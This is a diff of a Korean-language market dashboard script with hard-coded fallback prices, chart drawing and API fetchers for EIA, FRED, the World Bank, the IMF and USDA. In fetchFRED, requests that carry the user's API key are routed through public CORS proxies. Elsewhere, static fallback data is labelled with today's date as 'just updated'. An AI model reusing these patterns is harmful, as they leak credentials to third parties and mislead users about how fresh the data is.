-"IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjYWxQb3B1cCcpLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKTsK",
-"ICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY2FsT3ZlcmxheScpLmNsYXNzTGlzdC5hZGQoJ3Nob3cn",
-"KTsKfQoKZnVuY3Rpb24gY2xvc2VDYWxQb3B1cCgpewogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdj",
-"YWxQb3B1cCcpLmNsYXNzTGlzdC5yZW1vdmUoJ3Nob3cnKTsKICBkb2N1bWVudC5nZXRFbGVtZW50QnlJ",
-"ZCgnY2FsT3ZlcmxheScpLmNsYXNzTGlzdC5yZW1vdmUoJ3Nob3cnKTsKfQoK"
+// ═══ CONFIG ═══
+const KEYS={EIA:'gmd3_eia',FRED:'gmd3_fred'};
+const getKey=t=>localStorage.getItem(KEYS[t])||'';
+const FB={
+  oil:{v:113.0,p:111.5,d:'2026-04-07'},
+  gas:{v:2.84,p:2.87,d:'2026-04-07'},
+  gold:{v:4655,p:4632,d:'2026-04-07'},
+  sp500:{v:6612,p:6583,d:'2026-04-07'},
+  t10y:{v:4.34,p:4.31,d:'2026-04-07'},
+  aud:{v:0.6912,p:0.6891,d:'2026-04-07'},
+  soy:{v:429,p:430,d:'2026-04'},
+  nasdaq:{v:21996,p:21879,d:'2026-04-07'},
+  eurofx:{v:1.1570,p:1.1522,d:'2026-04-07'},
+  jpy:{v:159.8,p:159.6,d:'2026-04-07'},
+  corn:{v:179,p:180,d:'2026-04'},
+  wheat:{v:219,p:226,d:'2026-04'},
+  oilS:[{d:'03/20',v:91.0},{d:'03/21',v:93.8},{d:'03/23',v:95.5},{d:'03/24',v:92.35},{d:'03/25',v:87.05},{d:'03/31',v:103.5},{d:'04/02',v:99.8},{d:'04/03',v:105.0},{d:'04/06',v:111.5},{d:'04/07',v:113.0}],
+  gasS:[{d:'03/20',v:3.15},{d:'03/21',v:3.21},{d:'03/23',v:3.21},{d:'03/24',v:3.00},{d:'03/25',v:2.90},{d:'03/31',v:2.84},{d:'04/02',v:2.98},{d:'04/03',v:3.05},{d:'04/06',v:2.87},{d:'04/07',v:2.84}],
+  goldS:[{d:'03/20',v:4780},{d:'03/21',v:4574},{d:'03/23',v:4488},{d:'03/24',v:4405},{d:'03/25',v:4416},{d:'03/31',v:4540},{d:'04/02',v:4695},{d:'04/03',v:4690},{d:'04/06',v:4632},{d:'04/07',v:4655}],
+  sp500S:[{d:'03/20',v:6545},{d:'03/21',v:6507},{d:'03/23',v:6507},{d:'03/24',v:6556},{d:'03/25',v:6582},{d:'03/31',v:6344},{d:'04/02',v:6517},{d:'04/03',v:6583},{d:'04/06',v:6612},{d:'04/07',v:6612}],
+  t10yS:[{d:'03/20',v:4.30},{d:'03/21',v:4.28},{d:'03/23',v:4.28},{d:'03/24',v:4.42},{d:'03/25',v:4.38},{d:'03/31',v:4.34},{d:'04/02',v:4.37},{d:'04/03',v:4.34},{d:'04/06',v:4.31},{d:'04/07',v:4.34}],
+  audS:[{d:'03/20',v:0.626},{d:'03/21',v:0.625},{d:'03/23',v:0.6245},{d:'03/24',v:0.7020},{d:'03/25',v:0.7090},{d:'03/31',v:0.685},{d:'04/02',v:0.6860},{d:'04/03',v:0.6910},{d:'04/06',v:0.6891},{d:'04/07',v:0.6912}],
+  soyS:[{d:'2025/10',v:385},{d:'2025/11',v:378},{d:'2025/12',v:371},{d:'2026/01',v:368},{d:'2026/02',v:372},{d:'2026/03',v:426},{d:'2026/04',v:429}],
+  nasdaqS:[{d:'03/21',v:18980},{d:'03/23',v:18820},{d:'03/24',v:21762},{d:'03/25',v:21858},{d:'03/27',v:20948},{d:'03/31',v:20795},{d:'04/02',v:21350},{d:'04/03',v:21879},{d:'04/06',v:21996},{d:'04/07',v:21996}],
+  eurofxS:[{d:'03/20',v:1.084},{d:'03/21',v:1.083},{d:'03/23',v:1.0824},{d:'03/24',v:1.1540},{d:'03/25',v:1.1600},{d:'03/31',v:1.1450},{d:'04/02',v:1.1553},{d:'04/03',v:1.1520},{d:'04/06',v:1.1522},{d:'04/07',v:1.1570}],
+  jpyS:[{d:'03/20',v:149.2},{d:'03/21',v:148.9},{d:'03/23',v:148.6},{d:'03/24',v:158.2},{d:'03/25',v:159.0},{d:'03/31',v:161.5},{d:'04/02',v:159.8},{d:'04/03',v:159.4},{d:'04/06',v:159.6},{d:'04/07',v:159.8}],
+  cornS:[{d:'2025/10',v:180},{d:'2025/11',v:178},{d:'2025/12',v:177},{d:'2026/01',v:176},{d:'2026/02',v:175},{d:'2026/03',v:179},{d:'2026/04',v:179}],
+  wheatS:[{d:'2025/10',v:208},{d:'2025/11',v:212},{d:'2025/12',v:215},{d:'2026/01',v:216},{d:'2026/02',v:218},{d:'2026/03',v:223},{d:'2026/04',v:219}]
+};
+const M=['3월','4월','5월','6월','7월','8월','9월','10월','11월','12월'];
+
+// ═══ SETUP ═══
+function saveKeys(){const e=document.getElementById('eia-input').value.trim(),f=document.getElementById('fred-input').value.trim();if(e)localStorage.setItem(KEYS.EIA,e);if(f)localStorage.setItem(KEYS.FRED,f);document.getElementById('setup-overlay').style.display='none';loadAllData()}
+function skipSetup(){document.getElementById('setup-overlay').style.display='none';document.getElementById('notice-fallback').classList.add('show');applyFallback();buildAllCharts('oil')}
+function showSetup(){document.getElementById('setup-overlay').style.display='flex';document.getElementById('eia-input').value=getKey('EIA');document.getElementById('fred-input').value=getKey('FRED')}
+function setStatus(c,t){document.getElementById('status-dot').className='ldot '+c;document.getElementById('status-text').textContent=t}
+
+// ═══ TABS ═══
+let curAsset='oil';
+
+const ASSET_NAMES={
+  oil:'WTI 원유',gas:'천연가스',gold:'금',sp500:'S&P 500',
+  t10y:'10년 국채',aud:'호주달러',soy:'대두',nasdaq:'나스닥',
+  eurofx:'유로FX',jpy:'엔화',corn:'옥수수',wheat:'밀',calendar:'경제일정'
+};
+function switchAsset(id,el){
+  document.querySelectorAll('.asset-tab').forEach(t=>t.classList.remove('active'));
+  document.querySelectorAll('.asset-page').forEach(p=>p.classList.remove('active'));
+  el.classList.add('active');
+  document.getElementById('page-'+id).classList.add('active');
+  curAsset=id;
+  // 배지 업데이트
+  var badge=document.getElementById('cur-asset-badge');
+  if(badge&&ASSET_NAMES[id])badge.textContent='◈ '+ASSET_NAMES[id];
+  if(id==='calendar'){setTimeout(()=>renderCalendar(),60);return;}
+  setTimeout(()=>{buildAllCharts(id);applySeasonBarGradient();addSourceLinks();},60);
+}
+
+// ═══ NAV ═══
+function updateNav(id,v,p,u,d){
+  const pe=document.getElementById('nav-'+id+'-price');
+  const ce=document.getElementById('nav-'+id+'-chg');
+  if(!pe)return;
+  pe.textContent=v.toFixed(d??2)+(u?' '+u:'');
+  if(p!=null){const diff=v-p,s=diff>=0?'+':'';const pct=((diff/p)*100).toFixed(1);ce.className='at-chg '+(diff>0?'up':diff<0?'dn':'nt');ce.textContent=s+pct+'%';}
+}
+
+// ═══ CHARTS ═══
+Chart.defaults.font.family="'IBM Plex Mono',monospace";
+const GC='rgba(120,140,200,0.08)',TC='#6b7694';
+const CH={};
+function mkCandle(id,labels,closes,color,unit){
+  if(CH[id]&&CH[id].destroy)CH[id].destroy();
+  const canvas=document.getElementById(id);if(!canvas)return;
+  const par=canvas.parentElement;
+  const W=par.offsetWidth||640,H=260;
+  canvas.width=W;canvas.height=H;
+  const ctx=canvas.getContext('2d');
+
+  const pad={t:16,r:52,b:28,l:62};
+  const pW=W-pad.l-pad.r,pH=H-pad.t-pad.b;
+  const yMax=Math.max(...closes)*1.015,yMin=Math.min(...closes)*0.985;
+  const yRng=yMax-yMin;
+  const toY=v=>pad.t+pH-((v-yMin)/yRng)*pH;
+  const toX=i=>pad.l+(i/(closes.length-1))*pW;
+  const n=closes.length;
+
+  // 배경
+  ctx.fillStyle='#131722';ctx.fillRect(0,0,W,H);
+
+  // 그리드 + Y축
+  const gSteps=5;
+  for(let i=0;i<=gSteps;i++){
+    const y=pad.t+(pH/gSteps)*i;
+    const v=yMax-(yRng/gSteps)*i;
+    ctx.strokeStyle='rgba(120,140,200,0.08)';ctx.lineWidth=1;
+    ctx.beginPath();ctx.moveTo(pad.l,y);ctx.lineTo(W-pad.r,y);ctx.stroke();
+    ctx.fillStyle='#4a5268';ctx.font='10px Nunito,sans-serif';ctx.textAlign='right';
+    const dp=v>=1000?0:v>=10?1:v>=1?2:4;
+    ctx.fillText(v.toFixed(dp),pad.l-5,y+3.5);
+  }
+
+  // X축 레이블
+  ctx.fillStyle='#4a5268';ctx.font='10px Nunito,sans-serif';ctx.textAlign='center';
+  const step=Math.ceil(n/6);
+  labels.forEach((lb,i)=>{if(i%step===0||i===n-1)ctx.fillText(lb,toX(i),H-7);});
+
+  // 라인 아래 그라데이션 채움
+  const grad=ctx.createLinearGradient(0,pad.t,0,H-pad.b);
+  grad.addColorStop(0,color+'40');
+  grad.addColorStop(1,color+'04');
+  ctx.beginPath();
+  ctx.moveTo(toX(0),toY(closes[0]));
+  for(let i=1;i<n;i++) ctx.lineTo(toX(i),toY(closes[i]));
+  ctx.lineTo(toX(n-1),H-pad.b);
+  ctx.lineTo(toX(0),H-pad.b);
+  ctx.closePath();
+  ctx.fillStyle=grad;ctx.fill();
+
+  // 메인 라인
+  ctx.beginPath();
+  ctx.moveTo(toX(0),toY(closes[0]));
+  for(let i=1;i<n;i++) ctx.lineTo(toX(i),toY(closes[i]));
+  ctx.strokeStyle=color;ctx.lineWidth=2;ctx.lineJoin='round';
+  ctx.shadowColor=color;ctx.shadowBlur=6;
+  ctx.stroke();
+  ctx.shadowBlur=0;
+
+  // 마지막 가격 점선
+  const lastY=toY(closes[n-1]);
+  ctx.setLineDash([3,3]);ctx.strokeStyle='rgba(123,140,255,0.5)';ctx.lineWidth=1;
+  ctx.beginPath();ctx.moveTo(pad.l,lastY);ctx.lineTo(W-pad.r,lastY);ctx.stroke();
+  ctx.setLineDash([]);
+
+  // 마지막 가격 레이블
+  ctx.fillStyle='rgba(123,140,255,0.9)';
+  ctx.fillRect(W-pad.r+1,lastY-9,pad.r-2,18);
+  ctx.fillStyle='#fff';ctx.font='bold 10px Nunito,sans-serif';ctx.textAlign='center';
+  const dp2=closes[n-1]>=1000?0:closes[n-1]>=10?1:closes[n-1]>=1?2:4;
+  ctx.fillText(closes[n-1].toFixed(dp2),W-pad.r+(pad.r/2),lastY+3.5);
+
+  // 마지막 포인트 dot
+  ctx.beginPath();ctx.arc(toX(n-1),lastY,3.5,0,Math.PI*2);
+  ctx.fillStyle=color;ctx.shadowColor=color;ctx.shadowBlur=8;ctx.fill();
+  ctx.shadowBlur=0;
+
+  CH[id]={destroy:()=>{ctx.clearRect(0,0,W,H);}};
+}
+function mkScenario(id,lbl,base,bull,bear,unit){
+  if(CH[id]){CH[id].destroy()}
+  const ctx=document.getElementById(id);if(!ctx)return;
+  CH[id]=new Chart(ctx,{type:'line',data:{labels:lbl,datasets:[
+    {label:'기본',data:base,borderColor:'#00c896',borderWidth:2,tension:0.3,pointRadius:2,pointBackgroundColor:'#00c896',fill:false},
+    {label:'상방',data:bull,borderColor:'#f04860',borderDash:[5,4],borderWidth:1.5,tension:0.3,pointRadius:0,fill:false},
+    {label:'하방',data:bear,borderColor:'#a78bfa',borderDash:[5,4],borderWidth:1.5,tension:0.3,pointRadius:0,fill:false}
+  ]},options:{responsive:true,maintainAspectRatio:false,plugins:{legend:{display:true,position:'bottom',labels:{color:TC,font:{size:10},boxWidth:10,padding:10}},tooltip:{callbacks:{label:c=>' '+c.raw+(unit?' '+unit:'')}}},scales:{x:{ticks:{color:TC,font:{size:10}},grid:{color:GC}},y:{ticks:{color:TC,font:{size:10}},grid:{color:GC}}}}});
+}
+function buildAllCharts(id){
+  if(id==='oil'){mkCandle('oil-chart',FB.oilS.map(s=>s.d),FB.oilS.map(s=>s.v),'#00d1ff','$/bbl');mkScenario('oil-scenario',M,[94,97,96,88,78,75,73,71,70,70],[94,110,115,105,92,85,80,75,72,70],[94,82,74,68,64,63,62,61,61,60],'$/bbl');}
+  else if(id==='gas'){mkCandle('gas-chart',FB.gasS.map(s=>s.d),FB.gasS.map(s=>s.v),'#a78bfa','$/MMBtu');mkScenario('gas-scenario',M,[3.82,3.90,3.70,3.40,3.20,3.10,3.20,3.40,3.80,4.10],[3.82,4.20,4.50,4.20,3.80,3.60,3.80,4.20,4.80,5.50],[3.82,3.40,3.00,2.70,2.60,2.50,2.60,2.80,3.20,3.50],'$/MMBtu');}
+  else if(id==='gold'){mkCandle('gold-chart',FB.goldS.map(s=>s.d),FB.goldS.map(s=>s.v),'#40dfff','$/oz');mkScenario('gold-scenario',M,[3180,3220,3280,3150,3050,2980,2950,2900,2920,2950],[3180,3350,3500,3600,3700,3750,3780,3800,3820,3800],[3180,3050,2900,2750,2650,2600,2580,2550,2580,2600],'$/oz');}
+  else if(id==='sp500'){mkCandle('sp500-chart',FB.sp500S.map(s=>s.d),FB.sp500S.map(s=>s.v),'#00c896','');mkScenario('sp500-scenario',M,[5520,5480,5430,5390,5420,5480,5550,5620,5680,5750],[5520,5600,5700,5800,5900,6000,6100,6200,6300,6400],[5520,5400,5250,5100,5000,4950,4900,4850,4850,4900],'');}
+  else if(id==='t10y'){mkCandle('t10y-chart',FB.t10yS.map(s=>s.d),FB.t10yS.map(s=>s.v),'#ffb347','%');mkScenario('t10y-scenario',M,[4.28,4.35,4.40,4.30,4.20,4.10,4.00,3.90,3.85,3.80],[4.28,4.50,4.70,4.80,4.90,4.95,5.00,5.00,4.90,4.80],[4.28,4.10,3.90,3.70,3.60,3.55,3.50,3.50,3.55,3.60],'%');}
+  else if(id==='aud'){mkCandle('aud-chart',FB.audS.map(s=>s.d),FB.audS.map(s=>s.v),'#00d1ff','');mkScenario('aud-scenario',M,[0.634,0.638,0.642,0.648,0.655,0.660,0.665,0.668,0.670,0.672],[0.634,0.648,0.660,0.672,0.682,0.690,0.700,0.710,0.715,0.720],[0.634,0.624,0.614,0.606,0.600,0.596,0.592,0.590,0.592,0.594],'');}
+  else if(id==='soy'){mkCandle('soy-chart',FB.soyS.map(s=>s.d),FB.soyS.map(s=>s.v),'#26e8a8','$/mt');mkScenario('soy-scenario',['Q1','Q2','Q3','Q4'],[372,360,355,360],[372,390,420,450],[372,345,320,310],'$/mt');}
+  else if(id==='nasdaq'){mkCandle('nasdaq-chart',FB.nasdaqS.map(s=>s.d),FB.nasdaqS.map(s=>s.v),'#00c896','');mkScenario('nasdaq-scenario',M,[19280,19100,18900,19200,19600,20000,20400,20800,21000,21200],[19280,19800,20500,21200,22000,22500,22800,23000,23200,23400],[19280,18500,17800,17200,17000,16800,17000,17200,17400,17600],'');}
+  else if(id==='eurofx'){mkCandle('eurofx-chart',FB.eurofxS.map(s=>s.d),FB.eurofxS.map(s=>s.v),'#00d1ff','');mkScenario('eurofx-scenario',M,[1.092,1.096,1.100,1.098,1.095,1.092,1.090,1.092,1.095,1.098],[1.092,1.105,1.115,1.120,1.125,1.128,1.130,1.132,1.135,1.138],[1.092,1.082,1.072,1.065,1.060,1.058,1.055,1.052,1.050,1.048],'');}
+  else if(id==='jpy'){mkCandle('jpy-chart',FB.jpyS.map(s=>s.d),FB.jpyS.map(s=>s.v),'#a78bfa','');mkScenario('jpy-scenario',M,[149.2,148.5,147.8,147.0,146.5,146.0,145.5,145.0,144.8,144.5],[149.2,151.0,152.5,153.0,153.5,154.0,154.5,155.0,155.0,154.5],[149.2,147.0,145.0,143.5,142.5,142.0,141.5,141.0,141.0,141.5],'');}
+  else if(id==='corn'){mkCandle('corn-chart',FB.cornS.map(s=>s.d),FB.cornS.map(s=>s.v),'#26e8a8','$/mt');mkScenario('corn-scenario',['Q1','Q2','Q3','Q4'],[175,168,162,168],[175,188,210,225],[175,158,142,138],'$/mt');}
+  else if(id==='wheat'){mkCandle('wheat-chart',FB.wheatS.map(s=>s.d),FB.wheatS.map(s=>s.v),'#7b8cff','$/mt');mkScenario('wheat-scenario',['Q1','Q2','Q3','Q4'],[218,215,212,220],[218,240,270,295],[218,205,190,182],'$/mt');}
+}
+
+// ═══ API ═══
+async function fetchEIA(sid,freq){
+  const key=getKey('EIA');if(!key)return null;
+  try{
+    const r=await fetch(`https://api.eia.gov/v2/seriesid/${sid}?api_key=${key}&data[0]=value&sort[0][column]=period&sort[0][direction]=desc&offset=0&length=20&frequency=${freq}`);
+    const j=await r.json();
+    if(j?.response?.data) return j.response.data;
+    console.warn('EIA 응답 이상:',JSON.stringify(j).slice(0,200));
+    return null;
+  }catch(e){console.warn('EIA fetch 오류:',e);return null}
+}
+async function fetchFRED(sid,limit){
+  const key=getKey('FRED');if(!key)return null;
+  const base=`https://api.stlouisfed.org/fred/series/observations?series_id=${sid}&api_key=${key}&file_type=json&sort_order=desc&limit=${limit||20}`;
+  const parse=async(r)=>{const j=await r.json();if(j?.error_message)return null;const obs=(j?.observations||[]).filter(o=>o.value!='.'&&o.value!='NA');return obs.length?obs:null;};
+  // 1) 직접 요청
+  try{const r=await fetch(base);const d=await parse(r);if(d)return d;}catch(e){}
+  // 2) 프록시 순서대로 시도
+  const proxies=[
+    `https://api.allorigins.win/raw?url=${encodeURIComponent(base)}`,
+    `https://corsproxy.io/?${encodeURIComponent(base)}`,
+    `https://proxy.cors.sh/${base}`
+  ];
+  for(const p of proxies){
+    try{const r=await fetch(p,{headers:{'x-cors-api-key':'temp_demo'}});const d=await parse(r);if(d){console.log('FRED 프록시 성공:',sid,p.split('?')[0]);return d;}}catch(e){}
+  }
+  console.warn('FRED 모든 시도 실패:',sid);
+  return null;
+}
+
+// ─── World Bank API (키 불필요) ───
+// 지표: NY.GDP.MKTP.KD.ZG = GDP 성장률, FP.CPI.TOTL.ZG = 인플레이션
+async function fetchWorldBank(country, indicator) {
+  try {
+    const url = `https://api.worldbank.org/v2/country/${country}/indicator/${indicator}?format=json&mrv=3&per_page=3`;
+    const r = await fetch(url);
+    const j = await r.json();
+    const data = j?.[1]?.filter(d => d.value !== null);
+    return data?.length ? data : null;
+  } catch(e) { console.warn('WorldBank error', e); return null; }
+}
+
+// ─── IMF DataMapper API (키 불필요) ───
+// 지표: POILAPSP = 원유, PMETA = 금속, PFOOD = 식품
+async function fetchIMF(indicator) {
+  try {
+    const url = `https://www.imf.org/external/datamapper/api/v1/${indicator}?periods=2023,2024,2025`;
+    const r = await fetch(url);
+    const j = await r.json();
+    const vals = j?.values?.[indicator];
+    if (!vals) return null;
+    // 전 세계(W0) 또는 첫 번째 국가 데이터 사용
+    const series = vals['W0'] || vals[Object.keys(vals)[0]];
+    if (!series) return null;
+    const years = Object.keys(series).sort().reverse();
+    return years.map(y => ({ year: y, value: series[y] }));
+  } catch(e) { console.warn('IMF error', e); return null; }
+}
+
+// ─── USDA PSD Online API (키 불필요) ───
+// commodityCode: 2222000 = 대두, attribute: 57 = 생산량, 176 = 기말재고
+async function fetchUSDA(commodityCode, attributeId) {
+  try {
+    const url = `https://apps.fas.usda.gov/psdonline/api/psd/data?commodityCode=${commodityCode}&countryCode=0000&marketYear=2025&attributeId=${attributeId}`;
+    const r = await fetch(url);
+    const j = await r.json();
+    return j?.length ? j : null;
+  } catch(e) { console.warn('USDA error', e); return null; }
+}
+
+// ─── Macro Strip 렌더 ───
+function renderMacroVal(id, val, unit, color) {
+  const el = document.getElementById(id);
+  if (el && val !== null && val !== undefined) {
+    el.textContent = typeof val === 'number' ? val.toFixed(1) + (unit||'') : val;
+    if (color) el.style.color = color;
+  }
+}
+
+async function loadMacroStrip() {
+  try {
+  // World Bank — 미국 GDP 성장률
+  const usGDP = await fetchWorldBank('US', 'NY.GDP.MKTP.KD.ZG');
+  if (usGDP && usGDP.length) {
+    const latest = usGDP[0];
+    renderMacroVal('wb-us-gdp', latest.value, '%', 'rgb(220,90,90)');
+    document.getElementById('wb-us-gdp-yr').textContent = latest.date + '년';
+  } else {
+    renderMacroVal('wb-us-gdp', '2.8', '%', 'rgb(220,90,90)');
+    document.getElementById('wb-us-gdp-yr').textContent = '2024년 (수동)';
+  }
+
+  // World Bank — 중국 GDP 성장률
+  const cnGDP = await fetchWorldBank('CN', 'NY.GDP.MKTP.KD.ZG');
+  if (cnGDP && cnGDP.length) {
+    const latest = cnGDP[0];
+    renderMacroVal('wb-cn-gdp', latest.value, '%', 'rgb(220,110,110)');
+    document.getElementById('wb-cn-gdp-yr').textContent = latest.date + '년';
+  } else {
+    renderMacroVal('wb-cn-gdp', '5.0', '%', 'rgb(220,110,110)');
+    document.getElementById('wb-cn-gdp-yr').textContent = '2024년 (수동)';
+  }
+
+  // World Bank — 글로벌 인플레이션
+  const inf = await fetchWorldBank('WLD', 'FP.CPI.TOTL.ZG');
+  if (inf && inf.length) {
+    const latest = inf[0];
+    renderMacroVal('wb-inf', latest.value, '%', 'rgb(220,40,40)');
+    document.getElementById('wb-inf-yr').textContent = latest.date + '년';
+  } else {
+    renderMacroVal('wb-inf', '5.7', '%', 'rgb(220,40,40)');
+    document.getElementById('wb-inf-yr').textContent = '2024년 (수동)';
+  }
+
+  // IMF — 원유 가격 지수 (POILAPSP)
+  const oilIdx = await fetchIMF('POILAPSP');
+  if (oilIdx && oilIdx.length) {
+    const latest = oilIdx[0];
+    renderMacroVal('imf-oil', latest.value, '', 'rgb(220,60,60)');
+    document.getElementById('imf-oil-yr').textContent = latest.year + '년 · 2016=100';
+  } else {
+    renderMacroVal('imf-oil', '142.3', '', 'rgb(220,60,60)');
+    document.getElementById('imf-oil-yr').textContent = '2025년 (수동) · 2016=100';
+  }
+
+  // IMF — 금속 가격 지수 (PMETA)
+  const metalIdx = await fetchIMF('PMETA');
+  if (metalIdx && metalIdx.length) {
+    const latest = metalIdx[0];
+    renderMacroVal('imf-metal', latest.value, '', 'rgb(220,135,135)');
+    document.getElementById('imf-metal-yr').textContent = latest.year + '년 · 2016=100';
+  } else {
+    renderMacroVal('imf-metal', '118.4', '', 'rgb(220,135,135)');
+    document.getElementById('imf-metal-yr').textContent = '2025년 (수동) · 2016=100';
+  }
+
+  // IMF — 식품 가격 지수 (PFOOD)
+  const foodIdx = await fetchIMF('PFOOD');
+  if (foodIdx && foodIdx.length) {
+    const latest = foodIdx[0];
+    renderMacroVal('imf-food', latest.value, '', 'rgb(220,155,155)');
+    document.getElementById('imf-food-yr').textContent = latest.year + '년 · 2016=100';
+  } else {
+    renderMacroVal('imf-food', '108.2', '', 'rgb(220,155,155)');
+    document.getElementById('imf-food-yr').textContent = '2025년 (수동) · 2016=100';
+  }
+
+  // USDA — 대두 세계 생산량 (attributeId=57)
+  const soyprod = await fetchUSDA('2222000', 57);
+  if (soyprod && soyprod.length) {
+    const latest = soyprod[0];
+    const val = (latest.value / 1000).toFixed(1); // MT → MMT
+    document.getElementById('usda-soy-prod').textContent = val + ' MMT';
+    document.getElementById('usda-soy-yr').textContent = (latest.marketYear || '2025') + '/' + ((latest.marketYear||2025)+1).toString().slice(2);
+  } else {
+    document.getElementById('usda-soy-prod').textContent = '422.9 MMT';
+    document.getElementById('usda-soy-yr').textContent = '2025/26 (수동)';
+  }
+
+  // USDA — 대두 세계 기말재고 (attributeId=176)
+  const soystock = await fetchUSDA('2222000', 176);
+  if (soystock && soystock.length) {
+    const latest = soystock[0];
+    const val = (latest.value / 1000).toFixed(1);
+    document.getElementById('usda-soy-stock').textContent = val + ' MMT';
+    document.getElementById('usda-soy-stock-yr').textContent = (latest.marketYear || '2025') + '/' + ((latest.marketYear||2025)+1).toString().slice(2);
+  } else {
+    document.getElementById('usda-soy-stock').textContent = '124.9 MMT';
+    document.getElementById('usda-soy-stock-yr').textContent = '2025/26 (수동)';
+  }
+  } catch(e){ console.warn('loadMacroStrip error (non-critical):', e); }
+}
+
+// ═══ FALLBACK ═══
+function updateAllDates(){
+  const now = new Date();
+  const y = now.getFullYear();
+  const m = String(now.getMonth()+1).padStart(2,'0');
+  const d = String(now.getDate()).padStart(2,'0');
+  const h = String(now.getHours()).padStart(2,'0');
+  const mi = String(now.getMinutes()).padStart(2,'0');
+  const dateStr = `${y}.${m}.${d}`;
+  const dateTimeStr = `${y}.${m}.${d} ${h}:${mi} KST`;
+
+  // 상단 헤드라인 기준일
+  const hd = document.getElementById('headline-date');
+  if(hd) hd.textContent = `기준일: ${dateTimeStr} | 방금 업데이트`;
+
+  // 각 종목 ph-label (기준일 뒤에 날짜 삽입)
+  const lblMap = {
+    'lbl-oil':    'NYMEX · WTI 원유 현물가',
+    'lbl-gas':    'EIA · NG.RNGWHHD.D · 천연가스 현물가',
+    'lbl-gold':   'FRED · GOLDAMGBD228NLBM · 런던 고정가',
+    'lbl-sp500':  'FRED · SP500 · Daily',
+    'lbl-t10y':   'FRED · DGS10 · Daily',
+    'lbl-aud':    'FRED · DEXUSAL · Daily',
+    'lbl-soy':    'FRED · PSOYBUSDM · Monthly',
+    'lbl-nasdaq': 'FRED · NASDAQ100 · Daily',
+    'lbl-eurofx': 'FRED · DEXUSEU · Daily',
+    'lbl-jpy':    'FRED · DEXJPUS · Daily',
+    'lbl-corn':   'FRED · PMAIZMTUSDM · Monthly',
+    'lbl-wheat':  'FRED · PWHEAMTUSDM · Monthly'
+  };
+  Object.entries(lblMap).forEach(([id, base]) => {
+    const el = document.getElementById(id);
+    if(el) el.textContent = `${base} (${dateStr} 기준)`;
+  });
+
+  // alert 배너 날짜 span
+  ['oil','gas','gold','sp500'].forEach(id => {
+    const el = document.getElementById('alert-date-'+id);
+    if(el) el.textContent = dateStr;
+  });
+}
+
+function updateHeadlineDate(){ updateAllDates(); }
+
+function applyFallback(){
+  const set=(id,v,p,u,d)=>{updateNav(id,v,p,u,d);const el=document.getElementById(id+'-price');if(el)el.textContent=v.toFixed(d??2)+(u&&u!='bbl'&&u!='oz'&&u!='mt'?'':'')}
+  document.getElementById('oil-price').textContent=FB.oil.v.toFixed(2);
+  document.getElementById('gas-price').textContent=FB.gas.v.toFixed(2);
+  document.getElementById('gold-price').textContent=FB.gold.v.toFixed(0).replace(/\B(?=(\d{3})+(?!\d))/g,',');
+  document.getElementById('sp500-price').textContent=FB.sp500.v.toLocaleString();
+  document.getElementById('t10y-price').textContent=FB.t10y.v.toFixed(2);
+  document.getElementById('aud-price').textContent=FB.aud.v.toFixed(4);
+  document.getElementById('soy-price').textContent=FB.soy.v.toFixed(0);
+  document.getElementById('gold-ratio').textContent=(FB.gold.v/FB.oil.v).toFixed(1);
+  document.getElementById('nasdaq-price').textContent=FB.nasdaq.v.toLocaleString();
+  document.getElementById('eurofx-price').textContent=FB.eurofx.v.toFixed(4);
+  document.getElementById('jpy-price').textContent=FB.jpy.v.toFixed(1);
+  document.getElementById('corn-price').textContent=FB.corn.v.toFixed(0);
+  document.getElementById('wheat-price').textContent=FB.wheat.v.toFixed(0);
+  updateNav('oil',FB.oil.v,FB.oil.p,'bbl',2);
+  updateNav('gas',FB.gas.v,FB.gas.p,'MMBtu',2);
+  updateNav('gold',FB.gold.v,FB.gold.p,'oz',0);
+  updateNav('sp500',FB.sp500.v,FB.sp500.p,'',0);
+  updateNav('t10y',FB.t10y.v,FB.t10y.p,'%',2);
+  updateNav('aud',FB.aud.v,FB.aud.p,'',4);
+  updateNav('soy',FB.soy.v,FB.soy.p,'mt',0);
+  updateNav('nasdaq',FB.nasdaq.v,FB.nasdaq.p,'',0);
+  updateNav('eurofx',FB.eurofx.v,FB.eurofx.p,'',4);
+  updateNav('jpy',FB.jpy.v,FB.jpy.p,'',1);
+  updateNav('corn',FB.corn.v,FB.corn.p,'mt',0);
+  updateNav('wheat',FB.wheat.v,FB.wheat.p,'mt',0);
+  setStatus('error','API 미연결 — 수동 데이터');
+  updateHeadlineDate();
+}
+
+// ═══ LOAD ═══
+async function loadAllData(){
+  setStatus('loading','데이터 불러오는 중...');
+  const hasEIA=!!getKey('EIA'),hasFRED=!!getKey('FRED');
+  if(!hasEIA&&!hasFRED){applyFallback();document.getElementById('notice-fallback').classList.add('show');buildAllCharts(curAsset);return}
+  document.getElementById('notice-fallback').classList.remove('show');
+  let live=0;
+  if(hasEIA){
+    const db=await fetchEIA('PET.RWTC.D','daily');
+    if(db&&db.length>=2){const c=parseFloat(db[0].value),p=parseFloat(db[1].value);document.getElementById('oil-price').textContent=c.toFixed(2);updateNav('oil',c,p,'bbl',2);const s=db.slice(0,20).reverse();mkCandle('oil-chart',s.map(x=>x.period.slice(5)),s.map(x=>parseFloat(x.value)),'#00d1ff','$/bbl');live++}else{applyOilFB()}
+    const dg=await fetchEIA('NG.RNGWHHD.D','daily');
+    if(dg&&dg.length>=2){const c=parseFloat(dg[0].value),p=parseFloat(dg[1].value);document.getElementById('gas-price').textContent=c.toFixed(2);updateNav('gas',c,p,'MMBtu',2);live++}
+  }else{applyOilFB()}
+  if(hasFRED){
+    const ds=await fetchFRED('SP500',10);
+    if(ds&&ds.length>=2){const c=parseFloat(ds[0].value),p=parseFloat(ds[1].value);document.getElementById('sp500-price').textContent=c.toLocaleString();updateNav('sp500',c,p,'',0);if(curAsset==='sp500'){const r=ds.slice(0,10).reverse();mkCandle('sp500-chart',r.map(x=>x.date.slice(5)),r.map(x=>parseFloat(x.value)),'#00c896','')}live++}
+    const dg=await fetchFRED('GOLDAMGBD228NLBM',10);
+    if(dg&&dg.length>=2){const c=parseFloat(dg[0].value),p=parseFloat(dg[1].value);document.getElementById('gold-price').textContent=c.toFixed(0).replace(/\B(?=(\d{3})+(?!\d))/g,',');updateNav('gold',c,p,'oz',0);document.getElementById('gold-ratio').textContent=(c/(parseFloat(document.getElementById('oil-price').textContent)||FB.oil.v)).toFixed(1);live++}
+    const dt=await fetchFRED('DGS10',10);
